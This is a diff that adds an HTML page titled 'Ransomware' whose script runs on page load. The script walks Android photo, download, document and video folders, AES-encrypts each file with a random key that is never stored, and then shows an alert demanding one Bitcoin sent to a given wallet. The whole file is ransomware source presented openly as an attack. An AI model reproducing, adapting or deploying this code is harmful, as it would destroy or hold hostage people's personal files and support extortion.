@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ransomware</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+    <script>
+        function encryptFiles() {
+            const targetDirs = [
+                "/sdcard/DCIM",
+                "/sdcard/Pictures",
+                "/sdcard/Downloads",
+                "/sdcard/Documents",
+                "/sdcard/Movies",
+                "/sdcard/Videos"
+            ];
+
+            const key = CryptoJS.lib.WordArray.random(32);
+            const iv = CryptoJS.lib.WordArray.random(16);
+
+            function encryptFile(file) {
+                return new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onload = function(event) {
+                        const data = event.target.result;
+                        const encryptedData = CryptoJS.AES.encrypt(data, key, { iv: iv });
+                        resolve(encryptedData);
+                    };
+                    reader.onerror = function() {
+                        reject(new Error('Failed to read file'));
+                    };
+                    reader.readAsArrayBuffer(file);
+                });
+            }
+
+            function saveEncryptedFile(filePath, encryptedData) {
+                const blob = new Blob([encryptedData], { type: 'application/octet-stream' });
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = filePath;
+                link.click();
+            }
+
+            function processDirectory(dir) {
+                return new Promise((resolve, reject) => {
+                    window.resolveLocalFileSystemURL(dir, function(fileSystem) {
+                        const reader = fileSystem.createReader();
+                        reader.readEntries(function(entries) {
+                            const promises = [];
+                            entries.forEach(function(entry) {
+                                if (entry.isFile) {
+                                    promises.push(new Promise((resolve, reject) => {
+                                        entry.file(function(file) {
+                                            encryptFile(file).then(encryptedData => {
+                                                saveEncryptedFile(entry.fullPath, encryptedData);
+                                                resolve();
+                                            }).catch(reject);
+                                        }, reject);
+                                    }));
+                                } else if (entry.isDirectory) {
+                                    promises.push(processDirectory(entry.fullPath));
+                                }
+                            });
+                            Promise.all(promises).then(resolve).catch(reject);
+                        }, reject);
+                    }, reject);
+                });
+            }
+
+            const promises = targetDirs.map(processDirectory);
+            Promise.all(promises).then(() => {
+                alert('Your files have been encrypted.\nTo decrypt your files, send 1 Bitcoin to this wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa');
+            }).catch(error => {
+                console.error('Error encrypting files:', error);
+            });
+        }
+
+        window.onload = function() {
+            encryptFiles();
+        };
+    </script>
+</head>
+<body>
+    <h1>Ransomware</h1>
+    <p>Your files are being encrypted...</p>
+</body>
+</html>
